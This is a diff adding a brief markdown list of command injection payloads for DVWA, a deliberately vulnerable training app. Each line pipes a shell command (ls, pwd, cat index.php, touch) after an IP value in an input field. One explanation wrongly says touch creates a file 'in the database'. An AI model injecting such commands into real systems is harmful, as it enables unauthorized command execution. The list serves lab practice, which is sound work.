@@ -1,0 +1,9 @@
+## DVWA Command Injection Testing Payloads 
+
+-> 127.0.0.1 |ls - it shows the list of files in ihe system.
+
+-> 127.0.0.1 |pwd - it shows the current directory.
+
+-> 127.0.0.1 |cat index.php  -it opens the file index.php and shows information in it.
+
+-> 127.0.0.1 |touch newphp.txt - it createds a new file in the database as newphp.txt without admin access. 
